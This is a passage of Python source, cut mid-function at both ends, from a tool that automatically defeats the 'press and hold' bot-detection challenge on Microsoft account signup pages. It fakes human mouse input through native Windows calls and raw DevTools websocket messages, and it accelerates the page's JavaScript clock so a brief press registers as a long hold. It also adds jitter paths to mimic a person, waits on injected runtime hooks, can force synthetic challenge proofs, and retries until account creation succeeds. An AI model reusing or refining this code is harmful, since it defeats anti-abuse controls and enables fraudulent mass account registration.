                            return self.user32.GetForegroundWindow() == self.hwnd or ok
                        except Exception:
                            return ok

                    def screen_point(self, px, py):
                        g = self.geom or {}
                        screen_x = float(g.get("screenX") or 0)
                        screen_y = float(g.get("screenY") or 0)
                        outer_w = float(g.get("outerWidth") or 0)
                        outer_h = float(g.get("outerHeight") or 0)
                        inner_w = float(g.get("innerWidth") or 0)
                        inner_h = float(g.get("innerHeight") or 0)
                        # Keep this process DPI-unaware so Windows virtualizes
                        # SetCursorPos into the same logical coordinate space
                        # exposed as window.screenX/screenY in the page.
                        left_chrome = max(0.0, (outer_w - inner_w) / 2.0)
                        top_chrome = max(0.0, outer_h - inner_h - left_chrome)
                        return int(round(screen_x + left_chrome + float(px))), int(round(screen_y + top_chrome + float(py)))

                    def cursor_pos(self):
                        try:
                            class POINT(ctypes.Structure):
                                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
                            pt = POINT()
                            if self.user32.GetCursorPos(ctypes.byref(pt)):
                                return int(pt.x), int(pt.y)
                        except Exception:
                            pass
                        return None

                    def move_to(self, px, py):
                        sx, sy = self.screen_point(px, py)
                        self.user32.SetCursorPos(int(sx), int(sy))
                        return sx, sy

                    def down(self, px, py):
                        self._focus_browser_window()
                        sx, sy = self.move_to(px, py)
                        actual = self.cursor_pos()
                        print(
                            f"[Probe] native_sendinput down page=({float(px):.1f},{float(py):.1f}) "
                            f"screen=({sx},{sy}) cursor={actual} fg={self._foreground_info()}"
                        )
                        self.user32.mouse_event(self.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                        return sx, sy

                    def up(self, px, py):
                        sx, sy = self.move_to(px, py)
                        actual = self.cursor_pos()
                        print(
                            f"[Probe] native_sendinput up page=({float(px):.1f},{float(py):.1f}) "
                            f"screen=({sx},{sy}) cursor={actual} fg={self._foreground_info()}"
                        )
                        self.user32.mouse_event(self.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                        return sx, sy

                native_mouse = NativeSendInputMouse(page)
            except Exception as exc:
                print(f"[Probe] native_sendinput init failed; falling back to normal input: {exc!r}")
                native_mouse = None

        def start_async_raw_cdp_release(delay_ms, release_x, release_y):
            """Dispatch mouseReleased through a fresh DevTools websocket while page.mouse.move is blocked."""
            if not raw_cdp_endpoint:
                return None
            try:
                import threading
            except Exception as exc:
                print(f"[Probe] async_raw_cdp_release unavailable: {exc!r}")
                return None

            endpoint = str(raw_cdp_endpoint).rstrip("/")
            target_url = ""
            try:
                target_url = str(page.url or "")
            except Exception:
                target_url = ""

            def worker():
                t0 = time.monotonic()
                try:
                    time.sleep(max(0, int(delay_ms)) / 1000)
                    import urllib.request
                    import websocket

                    with urllib.request.urlopen(endpoint + "/json/list", timeout=5) as resp:
                        targets = json.loads(resp.read().decode("utf-8", "replace"))
                    pages = [t for t in targets if t.get("type") == "page" and t.get("webSocketDebuggerUrl")]
                    chosen = None
                    if target_url:
                        chosen = next((t for t in pages if t.get("url") == target_url), None)
                    if not chosen:
                        chosen = next(
                            (
                                t for t in pages
                                if any(s in str(t.get("url") or "") for s in ("signup.live.com", "login.live.com", "live.com"))
                            ),
                            None,
                        )
                    if not chosen and pages:
                        chosen = pages[0]
                    if not chosen:
                        raise RuntimeError("no page target with webSocketDebuggerUrl")
                    ws_url = chosen.get("webSocketDebuggerUrl")
                    conn = websocket.create_connection(ws_url, timeout=5, suppress_origin=True)
                    try:
                        payload = {
                            "id": 1,
                            "method": "Input.dispatchMouseEvent",
                            "params": {
                                "type": "mouseReleased",
                                "x": float(release_x),
                                "y": float(release_y),
                                "button": "left",
                                "buttons": 0,
                                "clickCount": 1,
                                "timestamp": time.time(),
                            },
                        }
                        conn.send(json.dumps(payload))
                        if async_raw_cdp_release_no_wait:
                            resp_text = "NO_WAIT"
                        else:
                            try:
                                resp_text = conn.recv()
                            except Exception:
                                resp_text = ""
                    finally:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    dt = int((time.monotonic() - t0) * 1000)
                    print(
                        "[Probe] async_raw_cdp_release sent "
                        f"dt_ms={dt} x={float(release_x):.1f} y={float(release_y):.1f} "
                        f"target={str(chosen.get('url') or '')[:100]} resp={str(resp_text)[:160]}"
                    )
                except Exception as exc:
                    dt = int((time.monotonic() - t0) * 1000)
                    print(f"[Probe] async_raw_cdp_release error dt_ms={dt}: {exc!r}")

            th = threading.Thread(target=worker, name="pxprobe-raw-cdp-release", daemon=True)
            th.start()
            return th

        def dispatch_hold_mouse(evt):
            nonlocal page_mouse_move_used
            typ = evt.get("type")
            use_budgeted_page_move = False
            if (
                typ == "mouseMoved"
                and int(hybrid_page_move_count or 0) > 0
                and page_mouse_move_used < int(hybrid_page_move_count or 0)
            ):
                use_budgeted_page_move = True
                page_mouse_move_used += 1
            use_oopif = bool(oopif_sender)
            use_native = bool(native_mouse) and not use_oopif
            use_page_mouse = (
                (not cdp_hold)
                or (hybrid_legacy_down_cdp_move_up and typ == "mousePressed")
                or (hybrid_legacy_down_cdp_move_legacy_up and typ in ("mousePressed", "mouseReleased"))
                or use_budgeted_page_move
            ) and not use_oopif and not use_native
            backend = "oopif.cdp" if use_oopif else ("native.sendinput" if use_native else ("page.mouse" if use_page_mouse else "cdp"))
            t0 = time.monotonic()
            if use_oopif:
                # Target coordinates for iframe DevTools sessions are local to
                # that frame's viewport.  Translate the top-page button point
                # through the iframe rect; if the rect is unavailable, use the
                # point as-is and let the trace show the miss.
                if oopif_frame_box:
                    local_x = float(evt.get("x", x)) - float(oopif_frame_box.get("x") or 0)
                    local_y = float(evt.get("y", y)) - float(oopif_frame_box.get("y") or 0)
                else:
                    local_x = float(evt.get("x", x))
                    local_y = float(evt.get("y", y))
                oopif_sender.dispatch_mouse(evt, local_x, local_y, no_wait=bool(oopif_cdp_no_wait))
            elif use_native:
                if typ == "mousePressed":
                    sx, sy = native_mouse.down(evt.get("x", x), evt.get("y", y))
                elif typ == "mouseReleased":
                    sx, sy = native_mouse.up(evt.get("x", x), evt.get("y", y))
                elif typ == "mouseMoved":
                    sx, sy = native_mouse.move_to(evt.get("x", x), evt.get("y", y))
                else:
                    sx, sy = native_mouse.move_to(evt.get("x", x), evt.get("y", y))
            elif not use_page_mouse:
                payload = dict(evt)
                payload.setdefault("timestamp", time.time())
                # Patchright/Playwright's Chromium RawMouseImpl adds
                # force=0.5 whenever a button is held down.  Our raw CDP path
                # originally omitted it, which makes the event shape differ
                # from the one page.mouse sends into AdsPower/SunBrowser.
                # Keep the raw path closer to page.mouse while still bypassing
                # Playwright's synchronous drag-interception wrapper.
                if int(payload.get("buttons") or 0) > 0:
                    payload.setdefault("force", 0.5)
                cdp_hold.send("Input.dispatchMouseEvent", payload)
            else:
                if typ == "mousePressed":
                    page.mouse.down()
                elif typ == "mouseReleased":
                    page.mouse.up()
                elif typ == "mouseMoved":
                    if use_budgeted_page_move and (hybrid_page_move_for_click or hybrid_page_move_no_reply):
                        backend = "page.mouse"
                        if hybrid_page_move_for_click:
                            backend += ".forClick"
                        if hybrid_page_move_no_reply:
                            backend += ".noReply"
                        try:
                            params = {
                                "x": evt.get("x", x),
                                "y": evt.get("y", y),
                            }
                            if hybrid_page_move_for_click:
                                params["forClick"] = True
                            if hybrid_page_move_no_reply:
                                page.mouse._impl_obj._channel.send_no_reply("mouseMove", None, params)
                            else:
                                page.mouse._sync(page.mouse._impl_obj._channel.send("mouseMove", None, params))
                        except Exception:
                            backend = "page.mouse"
                            page.mouse.move(evt.get("x", x), evt.get("y", y))
                    else:
                        page.mouse.move(evt.get("x", x), evt.get("y", y))
            dt_ms = int((time.monotonic() - t0) * 1000)
            hold_input_timings.append({
                "type": typ,
                "backend": backend,
                "dt_ms": dt_ms,
                "x": round(float(evt.get("x", x)), 2),
                "y": round(float(evt.get("y", y)), 2),
                **({"local_x": round(local_x, 2), "local_y": round(local_y, 2)} if use_oopif else {}),
                **({"screen_x": int(sx), "screen_y": int(sy)} if use_native else {}),
            })
            if dt_ms >= 100:
                print(
                    "[Probe] time_warp_hold input_timing "
                    f"type={typ} backend={backend} dt_ms={dt_ms} "
                    f"x={float(evt.get('x', x)):.1f} y={float(evt.get('y', y)):.1f}"
                )

        page.wait_for_timeout(80)
        knp_results = broadcast_knp_prestart("before_mouse_down")
        min_knp = max(0, int(min_knp_prestart_ok or 0))
        if min_knp:
            max_knp_tries = max(1, int(prehold_hook_guard_retries or 0) + 1)
            effective_min_knp = min_knp
            eligible_knp = 0
            knp_ok = 0
            for knp_try in range(max_knp_tries):
                eligible_knp = sum(1 for item in knp_results if (not require_chctx_runtime_ready or item.get("isChctx")))
                knp_ok = sum(
                    1
                    for item in knp_results
                    if item.get("ready")
                    and item.get("hasEn")
                    and item.get("readySource") == "exact_qi"
                    and (not require_chctx_runtime_ready or item.get("isChctx"))
                )
                if knp_ok >= effective_min_knp:
                    break
                if knp_try + 1 >= max_knp_tries:
                    break
                print(
                    "[Probe] prehold hook guard: exact KNP ready/en not observed "
                    f"ok={knp_ok}/{effective_min_knp} eligible={eligible_knp} "
                    f"try={knp_try + 1}/{max_knp_tries}; waiting before retry"
                )
                try:
                    install_late_runtime_hook(active_score_qi, reason=f"knp_retry_{knp_try + 2}")
                except Exception:
                    pass
                page.wait_for_timeout(650 + knp_try * 350)
                knp_results = broadcast_knp_prestart(f"before_mouse_down_retry_{knp_try + 2}")
            if knp_ok < effective_min_knp:
                ready_label = "ch_ctx KNP" if require_chctx_runtime_ready else "KNP"
                print(
                    "[Probe] prehold hook guard: aborting before mouse input "
                    f"because {ready_label} exact ready/en coverage is too low "
                    f"ok={knp_ok}/{effective_min_knp} configured_min={min_knp} eligible={eligible_knp}"
                )
                try:
                    broadcast_time_warp("stop")
                except Exception:
                    pass
                return False
        # Start the accelerated clock only after exact KNP material is ready.
        # Otherwise the KNP readiness wait itself inflates fake hold time before
        # the button is pressed, producing 35s+ proof timelines.
        broadcast_time_warp("start")
        pre_down_dwell_ms = max(0, int(pre_down_dwell_ms or 0))
        if pre_down_dwell_ms:
            print(f"[Probe] time_warp_hold: pre-down dwell {pre_down_dwell_ms}ms with hover jitter")
            dwell_start = time.monotonic()
            hover_path = [
                (0.0, 0.0), (0.35, -0.18), (0.58, 0.12), (0.22, 0.32),
                (-0.16, 0.20), (-0.42, -0.06), (-0.18, -0.26), (0.12, -0.14),
            ]
            idx = 0
            while (time.monotonic() - dwell_start) * 1000 < pre_down_dwell_ms:
                remaining = pre_down_dwell_ms - int((time.monotonic() - dwell_start) * 1000)
                time.sleep(max(10, min(90, remaining)) / 1000)
                dx, dy = hover_path[idx % len(hover_path)]
                idx += 1
                dispatch_hold_mouse({
                    "type": "mouseMoved",
                    "x": x + dx,
                    "y": y + dy,
                    "button": "none",
                    "buttons": 0,
                })
        # Do not run the force-restart KNP broker while the button is already
        # physically pressed.  On AdsPower CDP this can block for ~9-10s and
        # silently turns a requested 6.5s hold into a 16s+ hold.  The normal
        # prestart above is enough to seed Knp for the final proof; if it is
        # slow, it happens before mouse down and does not contaminate PX561 z.
        dispatch_hold_mouse({
            "type": "mousePressed",
            "x": x,
            "y": y,
            "button": "left",
            "buttons": 1,
            "clickCount": 1,
        })
        real_hold_started = time.monotonic()
        if async_raw_cdp_release_ms > 0 and raw_cdp_endpoint:
            async_release_thread = start_async_raw_cdp_release(async_raw_cdp_release_ms, x + 0.2, y - 0.1)
            async_release_started = async_release_thread is not None

        wall_ms = max(30, int(wall_ms))
        # Give the challenge a compact but non-trivial pressed-move stream.
        # With the JS clock accelerated, these samples span a fake long hold
        # while only consuming about one real second.
        # CDP-backed fingerprint browsers can spend hundreds of milliseconds
        # per mouse.move call.  Too many pressed-move samples make the real
        # hold far exceed wall_ms (observed ~19s for a requested 7.5s hold),
        # which in turn creates overlong PX561 z/timing and tends to cause a
        # post-success re-challenge.  Keep a small non-zero movement stream and
        # let the timer/event warp carry the long-hold semantics.
        if legacy_short_hold_input or hybrid_legacy_down_cdp_move_up or hybrid_legacy_down_cdp_move_legacy_up:
            # Match the old 20260620 short-proof route: for a ~900ms physical
            # press it generated about 10 in-hold jitter samples through the
            # Playwright page.mouse path.  The conservative Ads/CDP path only
            # emits 3 samples for 900ms and did not trigger a final PX561 in
            # the first old-route replication test.
            if int(legacy_short_hold_steps or 0) > 0:
                steps = max(1, min(24, int(legacy_short_hold_steps)))
            else:
                steps = max(6, min(16, wall_ms // 85))
        elif dense_cdp_hold_input:
            # Same dense pressed-move cadence as the legacy 20260620 path, but
            # keep the CDP Input.dispatchMouseEvent backend.  In AdsPower the
            # legacy page.mouse backend can block for seconds while the denser
            # stream is what actually triggered final PX561; this variant tests
            # that trigger without sacrificing the ~1s wall bound.
            steps = max(6, min(16, wall_ms // 85))
        else:
            steps = max(3, min(6, wall_ms // 1200))
        slice_ms = max(12, wall_ms // (steps + 1))
        jitter_path = [
            (0.10, -0.10), (0.28, -0.18), (0.42, -0.05), (0.25, 0.12),
            (0.05, 0.22), (-0.12, 0.16), (-0.26, 0.05), (-0.18, -0.12),
            (0.02, -0.20), (0.18, -0.08), (0.30, 0.10), (0.12, 0.18),
            (-0.05, 0.10), (-0.20, -0.02), (-0.08, -0.16), (0.08, -0.06),
        ]
        elapsed = 0
        sleep_total_ms = 0
        for i in range(steps):
            # Do the physical hold pacing from Python, not through
            # page.wait_for_timeout().  While the hsprotect frames have patched
            # timer APIs for time-warp, routing this wait through the page can
            # skew the real wall duration and makes the proof look much longer
            # than the requested wall_ms.
            sleep_t0 = time.monotonic()
            time.sleep(slice_ms / 1000)
            sleep_total_ms += int((time.monotonic() - sleep_t0) * 1000)
            elapsed += slice_ms
            dx, dy = jitter_path[i % len(jitter_path)]
            dispatch_hold_mouse({
                "type": "mouseMoved",
                "x": x + dx,
                "y": y + dy,
                "button": "left",
                "buttons": 1,
            })
            if async_release_started and int(hybrid_page_move_count or 0) > 0 and page_mouse_move_used >= int(hybrid_page_move_count or 0):
                print(
                    "[Probe] time_warp_hold: async release mode; stopping local move stream "
                    f"after page_mouse_move_used={page_mouse_move_used}"
                )
                break
        tail = max(0, wall_ms - elapsed)
        if async_release_started:
            tail = 0
            if async_release_thread:
                try:
                    async_release_thread.join(timeout=0.2)
                except Exception:
                    pass
        if tail:
            sleep_t0 = time.monotonic()
            time.sleep(tail / 1000)
            sleep_total_ms += int((time.monotonic() - sleep_t0) * 1000)
        if async_release_started:
            print("[Probe] time_warp_hold: skipping in-band release because async raw-CDP release was scheduled")
        else:
            dispatch_hold_mouse({
                "type": "mouseReleased",
                "x": x + 0.2,
                "y": y - 0.1,
                "button": "left",
                "buttons": 0,
                "clickCount": 1,
            })
        real_hold_wall_ms = int((time.monotonic() - real_hold_started) * 1000)
        broadcast_time_warp("stop")
        try:
            input_total_ms = sum(int(item.get("dt_ms") or 0) for item in hold_input_timings)
            slow = [item for item in hold_input_timings if int(item.get("dt_ms") or 0) >= 100]
            slow_text = "; ".join(
                f"{idx}:{item.get('type')}:{item.get('backend')}:{item.get('dt_ms')}ms"
                for idx, item in enumerate(hold_input_timings)
                if int(item.get("dt_ms") or 0) >= 100
            )
            print(
                "[Probe] time_warp_hold input_summary "
                f"steps={steps} slice_ms={slice_ms} tail_ms={tail} "
                f"sleep_total_ms={sleep_total_ms} input_total_ms={input_total_ms} "
                f"slow_count={len(slow)} slow=[{slow_text}]"
            )
        except Exception as exc:
            print(f"[Probe] time_warp_hold input_summary_error: {exc!r}")
        print(f"[Probe] time_warp_hold: short physical hold dispatched actual_wall_ms={real_hold_wall_ms}")
    except Exception as exc:
        try:
            page.mouse.up()
        except Exception:
            pass
        print(f"[Probe] time_warp_hold input error: {exc!r}")
        return False

    force_after_hold_ms = int(
        force_synthetic_final_after_hold_ms
        if force_synthetic_final_after_hold_ms is not None
        else -1
    )
    if force_synthetic_final_on_timeout and force_after_hold_ms >= 0:
        delay_ms = max(0, force_after_hold_ms)
        print(f"[Probe] time_warp_hold: force synthetic final scheduled after hold delay={delay_ms}ms")
        if delay_ms:
            page.wait_for_timeout(delay_ms)
        forced = force_synthetic_final_probe(
            controller,
            page,
            template_network=force_synthetic_final_template_network,
            preserve_bfa=force_synthetic_final_preserve_bfa,
            trigger_success_signals=force_synthetic_final_trigger_signals,
            wait_after_ms=min(max(2500, int(wait_after_ms or 0)), 8000),
            force_no_u0=force_synthetic_final_no_u0,
        )
        if forced:
            return True

    page.wait_for_timeout(max(700, int(stop_delay_ms) + 450))
    if not skip_mid_snapshots:
        try:
            after_path, after_data = save_probe_state(page, out_dir, email, mode, "after_time_warp")
            print(f"[Probe] saved after_time_warp: {after_path}")
            summarize_probe(after_data)
        except Exception as exc:
            print(f"[Probe] time_warp_hold after save failed: {exc!r}")

    deadline = time.time() + max(1000, wait_after_ms) / 1000
    wait_started = time.time()
    visible_retry_fired = False
    close_retry_fired = False
    result_retry_fired = False
    close_grace_used = False
    finished_seen_at = None
    last_state = None

    def retry_current_hold(reason: str, delay_ms: int = 900):
        remaining = int(attempts or 1) - 1
        if remaining <= 0:
            return None
        print(f"[Probe] time_warp_hold: {reason}; retrying fresh 5s hold; remaining={remaining}")
        page.wait_for_timeout(max(250, int(delay_ms or 0)))
        return protocol_time_warp_hold(
            controller,
            page,
            out_dir,
            email,
            mode,
            wait_before_ms,
            wait_after_ms,
            hold_ms=hold_ms,
            wall_ms=wall_ms,
            stop_delay_ms=stop_delay_ms,
            prewait_ms=prewait_ms,
            pre_down_dwell_ms=pre_down_dwell_ms,
            frame_scope=frame_scope,
            install_mode=install_mode,
            skip_mid_snapshots=skip_mid_snapshots,
            attempts=remaining,
            runtime_hook_js=runtime_hook_js,
            install_runtime_hook_late=install_runtime_hook_late,
            retry_visible_challenge_after_ms=retry_visible_challenge_after_ms,
            finished_stable_ms=finished_stable_ms,
            abort_on_score1=abort_on_score1,
            legacy_short_hold_input=legacy_short_hold_input,
            dense_cdp_hold_input=dense_cdp_hold_input,
            hybrid_legacy_down_cdp_move_up=hybrid_legacy_down_cdp_move_up,
            hybrid_legacy_down_cdp_move_legacy_up=hybrid_legacy_down_cdp_move_legacy_up,
            hybrid_page_move_count=hybrid_page_move_count,
            legacy_short_hold_steps=legacy_short_hold_steps,
            async_raw_cdp_release_ms=async_raw_cdp_release_ms,
            raw_cdp_endpoint=raw_cdp_endpoint,
            hybrid_page_move_for_click=hybrid_page_move_for_click,
            hybrid_page_move_no_reply=hybrid_page_move_no_reply,
            async_raw_cdp_release_no_wait=async_raw_cdp_release_no_wait,
            oopif_cdp_hold_input=oopif_cdp_hold_input,
            oopif_cdp_no_wait=oopif_cdp_no_wait,
            native_sendinput_hold_input=native_sendinput_hold_input,
            min_runtime_hook_ready_frames=min_runtime_hook_ready_frames,
            min_knp_prestart_ok=min_knp_prestart_ok,
            require_chctx_runtime_ready=require_chctx_runtime_ready,
            prehold_hook_guard_retries=prehold_hook_guard_retries,
            force_synthetic_final_on_timeout=force_synthetic_final_on_timeout,
            force_synthetic_final_template_network=force_synthetic_final_template_network,
            force_synthetic_final_preserve_bfa=force_synthetic_final_preserve_bfa,
            force_synthetic_final_trigger_signals=force_synthetic_final_trigger_signals,
            force_synthetic_final_after_hold_ms=force_synthetic_final_after_hold_ms,
            force_synthetic_final_no_u0=force_synthetic_final_no_u0,
            captcha_close_grace_ms=captcha_close_grace_ms,
            prehold_readiness_gate_ms=prehold_readiness_gate_ms,
            prehold_loaded_min_age_ms=prehold_loaded_min_age_ms,
            real_target_wait_ms=real_target_wait_ms,
        )

    while time.time() < deadline:
        try:
            s1 = score1_detected(active_score_qi)
            if s1:
                print(f"[Probe] time_warp_hold: aborting after hold because score|1 detected: {s1}")
                return False
            try:
                account_state = controller.get_create_account_state(page)
                if account_state.get("create_success") or int(account_state.get("create_requests") or 0) > 0:
                    print(f"[Probe] time_warp_hold: CreateAccount observed while waiting; state={account_state}")
                    return True
            except Exception:
                pass
            try:
                last_result = str(FINAL_FETCH_GUARD_STATE.get("last_result") or "")
                last_result_at = float(FINAL_FETCH_GUARD_STATE.get("last_result_at") or 0.0)
                last_qi = str(FINAL_FETCH_GUARD_STATE.get("last_qi") or "")
                last_seq = str(FINAL_FETCH_GUARD_STATE.get("last_seq") or "")
                if not last_result:
                    # The routed normalizer and the passive response listener
                    # run through different Playwright callback paths.  On
                    # some retry samples the route log publishes result|-1, but
                    # the shared guard is not visible to this polling loop
                    # before the 7s visible-retry fallback fires.  Use the
                    # passive collector capture as a same-process fallback so a
                    # rejected proof can immediately start a fresh challenge.
                    try:
                        capture_state = getattr(page, "_pxprobe_collector_capture", None) or {}
                        for resp in reversed(list(capture_state.get("responses") or [])[-8:]):
                            try:
                                seen_at = float(resp.get("seen_at") or 0.0)
                            except Exception:
                                seen_at = 0.0
                            results = [str(x) for x in (resp.get("results") or [])]
                            if seen_at >= wait_started and any(x.startswith("oIIoIooo|-1") for x in results):
                                last_result = "-1"
                                last_result_at = seen_at
                                last_qi = str(resp.get("qi") or last_qi)
                                last_seq = str(resp.get("seq") or last_seq)
                                break
                    except Exception:
                        pass
                if getattr(controller, "_protocol_takeover_accept_result0", False):
                    result0_at = 0.0
                    result0_qi = ""
                    result0_seq = ""
                    ignored_result0 = None
                    if (
                        last_result == "0"
                        and last_result_at >= wait_started
                        and (not active_score_qi or str(last_qi or "") == active_score_qi)
                    ):
                        result0_at = last_result_at
                        result0_qi = last_qi
                        result0_seq = last_seq
                    elif last_result == "0" and last_result_at >= wait_started:
                        ignored_result0 = {"qi": last_qi, "seq": last_seq, "source": "final_guard"}
                    else:
                        try:
                            capture_state = getattr(page, "_pxprobe_collector_capture", None) or {}
                            for resp in reversed(list(capture_state.get("responses") or [])[-8:]):
                                try:
                                    seen_at = float(resp.get("seen_at") or 0.0)
                                except Exception:
                                    seen_at = 0.0
                                results = [str(x) for x in (resp.get("results") or [])]
                                # In protocol_takeover V1 the accepted final
                                # can arrive during stop-delay/snapshot, before
                                # wait_started is initialized.  Treat the latest
                                # result|0 in the current capture window as
                                # enough to hand control back to V1, which then
                                # posts risk/verify immediately.
                                if any(x.startswith("oIIoIooo|0") for x in results):
                                    qi = str(resp.get("qi") or "")
                                    if active_score_qi and qi != active_score_qi:
                                        ignored_result0 = {
                                            "qi": qi,
                                            "seq": str(resp.get("seq") or ""),
                                            "source": "collector_capture",
                                        }
                                        continue
                                    result0_at = seen_at
                                    result0_qi = qi
                                    result0_seq = str(resp.get("seq") or "")
                                    break
                        except Exception:
                            pass
                    if result0_at:
                        print(
                            "[Probe] time_warp_hold: collector result|0 observed; "
                            f"returning early for protocol_takeover qi={result0_qi} seq={result0_seq}"
                        )
                        return True
                    if ignored_result0:
                        print(
                            "[Probe] time_warp_hold: ignoring collector result|0 for non-active qi "
                            f"qi={ignored_result0.get('qi')} seq={ignored_result0.get('seq')} "
                            f"active_qi={active_score_qi} source={ignored_result0.get('source')}"
                        )
                if last_result == "-1" and last_result_at >= wait_started:
                    if int(attempts or 1) > 1 and not result_retry_fired:
                        result_retry_fired = True
                        retried = retry_current_hold(
                            f"collector result|-1 observed qi={last_qi} seq={last_seq}",
                            delay_ms=1200,
                        )
                        if retried is not None:
                            return retried
                    print(
                        "[Probe] time_warp_hold: collector result|-1 observed; no retry budget "
                        f"qi={last_qi} seq={last_seq}"
                    )
                    return False
            except Exception:
                pass
            close_failed_url = captcha_close_failed_frame()
            if close_failed_url:
                # In older runs a status=-1 frame looked terminal.  Newer live
                # evidence shows the host can reload another ch_ctx=1 challenge
                # after the close and still emit later HumanCaptcha_Success
                # events.  If this attempt has retry budget, give the host a
                # moment to replace the stale close frame, then recurse instead
                # of aborting the whole registration.
                if int(attempts or 1) > 1 and not close_retry_fired:
                    close_retry_fired = True
                    print(
                        "[Probe] time_warp_hold: captcha close status=-1 observed; "
                        f"waiting for fresh retry; remaining={int(attempts) - 1} url={close_failed_url}"
                    )
                    page.wait_for_timeout(max(900, int(retry_visible_challenge_after_ms or 0) // 3))
                    return protocol_time_warp_hold(
                        controller,
                        page,
                        out_dir,
                        email,
                        mode,
                        wait_before_ms,
                        wait_after_ms,
                        hold_ms=hold_ms,
                        wall_ms=wall_ms,
                        stop_delay_ms=stop_delay_ms,
                        prewait_ms=prewait_ms,
                        pre_down_dwell_ms=pre_down_dwell_ms,
                        frame_scope=frame_scope,
                        install_mode=install_mode,
                        skip_mid_snapshots=skip_mid_snapshots,
                        attempts=int(attempts) - 1,
                        runtime_hook_js=runtime_hook_js,
                        install_runtime_hook_late=install_runtime_hook_late,
                        retry_visible_challenge_after_ms=retry_visible_challenge_after_ms,
                        finished_stable_ms=finished_stable_ms,
                        abort_on_score1=abort_on_score1,
                        legacy_short_hold_input=legacy_short_hold_input,
                        dense_cdp_hold_input=dense_cdp_hold_input,
                        hybrid_legacy_down_cdp_move_up=hybrid_legacy_down_cdp_move_up,
                        hybrid_legacy_down_cdp_move_legacy_up=hybrid_legacy_down_cdp_move_legacy_up,
                        hybrid_page_move_count=hybrid_page_move_count,
                        legacy_short_hold_steps=legacy_short_hold_steps,
                        async_raw_cdp_release_ms=async_raw_cdp_release_ms,
                        raw_cdp_endpoint=raw_cdp_endpoint,
                        hybrid_page_move_for_click=hybrid_page_move_for_click,
                        hybrid_page_move_no_reply=hybrid_page_move_no_reply,
                        async_raw_cdp_release_no_wait=async_raw_cdp_release_no_wait,
                        force_synthetic_final_on_timeout=force_synthetic_final_on_timeout,
                        force_synthetic_final_template_network=force_synthetic_final_template_network,
                        force_synthetic_final_preserve_bfa=force_synthetic_final_preserve_bfa,
                        force_synthetic_final_trigger_signals=force_synthetic_final_trigger_signals,
                        force_synthetic_final_after_hold_ms=force_synthetic_final_after_hold_ms,
                        force_synthetic_final_no_u0=force_synthetic_final_no_u0,
                        min_runtime_hook_ready_frames=min_runtime_hook_ready_frames,
                        min_knp_prestart_ok=min_knp_prestart_ok,
                        require_chctx_runtime_ready=require_chctx_runtime_ready,
                        prehold_hook_guard_retries=prehold_hook_guard_retries,
                        captcha_close_grace_ms=captcha_close_grace_ms,
                        prehold_readiness_gate_ms=prehold_readiness_gate_ms,
                        prehold_loaded_min_age_ms=prehold_loaded_min_age_ms,
                        real_target_wait_ms=real_target_wait_ms,
                    )
                close_grace = max(0, int(captcha_close_grace_ms or 0))
                if close_grace > 0 and not close_grace_used:
                    # Older accepted 1s traces can show captcha_close?status=-1
                    # a moment before the host consumes the final/W0 collector
                    # result and submits CreateAccount.  Treat the close frame as
                    # "suspicious but not terminal" for one bounded grace window
                    # so late collector responses / host callbacks can land.
                    close_grace_used = True
                    print(
                        "[Probe] time_warp_hold: captcha close status=-1 observed; "
                        f"grace-waiting {close_grace}ms for late CreateAccount/HS success "
                        f"url={close_failed_url}"
                    )
                    grace_deadline = time.time() + close_grace / 1000.0
                    while time.time() < grace_deadline:
                        try:
                            account_state = controller.get_create_account_state(page)
                            if account_state.get("create_success") or int(account_state.get("create_requests") or 0) > 0:
                                print(
                                    "[Probe] time_warp_hold: CreateAccount observed during close grace; "
                                    f"state={account_state}"
                                )
                                return True
                        except Exception:
                            pass
                        try:
                            state_after_close = controller._captcha_finished_or_blocked(page)
                            if state_after_close == "finished":
                                if finished_seen_at is None:
                                    finished_seen_at = time.time()
                                if (time.time() - finished_seen_at) * 1000 >= max(0, int(finished_stable_ms or 0)):
                                    print("[Probe] time_warp_hold: challenge finished during close grace")
                                    return True
                            elif state_after_close in ("retry", "blocked"):
                                last_state = state_after_close
                                break
                        except Exception:
                            pass
                        page.wait_for_timeout(250)
                    print(
                        "[Probe] time_warp_hold: close grace expired/no CreateAccount; "
                        f"last_state={last_state}"
                    )
                    continue
                print(f"[Probe] time_warp_hold: captcha close status=-1 observed; no retry budget url={close_failed_url}")
                if force_synthetic_final_on_timeout:
                    forced = force_synthetic_final_probe(
                        controller,
                        page,
                        template_network=force_synthetic_final_template_network,
                        preserve_bfa=force_synthetic_final_preserve_bfa,
                        trigger_success_signals=force_synthetic_final_trigger_signals,
                        wait_after_ms=min(max(2500, int(wait_after_ms or 0)), 8000),
                        force_no_u0=force_synthetic_final_no_u0,
                    )
                    if forced:
                        return True
                return False
            state = controller._captcha_finished_or_blocked(page)
            last_state = state
            if state == "finished":
                if finished_seen_at is None:
                    finished_seen_at = time.time()
                    print(
                        "[Probe] time_warp_hold: challenge iframe disappeared; "
                        f"requiring stable {int(finished_stable_ms or 0)}ms or CreateAccount"
                    )
                if (time.time() - finished_seen_at) * 1000 >= max(0, int(finished_stable_ms or 0)):
                    return True
            else:
                finished_seen_at = None
            if state == "blocked":
                return False
            if state == "retry":
                print("[Probe] time_warp_hold: challenge requested retry")
                if int(attempts or 1) > 1:
                    print(f"[Probe] time_warp_hold: retrying with fresh hold attempt; remaining={int(attempts) - 1}")
                    page.wait_for_timeout(900)
                    return protocol_time_warp_hold(
                        controller,
                        page,
                        out_dir,
                        email,
                        mode,
                        wait_before_ms,
                        wait_after_ms,
                        hold_ms=hold_ms,
                        wall_ms=wall_ms,
                        stop_delay_ms=stop_delay_ms,
                        prewait_ms=prewait_ms,
                        pre_down_dwell_ms=pre_down_dwell_ms,
                        frame_scope=frame_scope,
                        install_mode=install_mode,
                        skip_mid_snapshots=skip_mid_snapshots,
                        attempts=int(attempts) - 1,
                        runtime_hook_js=runtime_hook_js,
                        install_runtime_hook_late=install_runtime_hook_late,
                        retry_visible_challenge_after_ms=retry_visible_challenge_after_ms,
                        finished_stable_ms=finished_stable_ms,
                        abort_on_score1=abort_on_score1,
                        legacy_short_hold_input=legacy_short_hold_input,
                        dense_cdp_hold_input=dense_cdp_hold_input,
                        hybrid_legacy_down_cdp_move_up=hybrid_legacy_down_cdp_move_up,
                        hybrid_legacy_down_cdp_move_legacy_up=hybrid_legacy_down_cdp_move_legacy_up,
                        hybrid_page_move_count=hybrid_page_move_count,
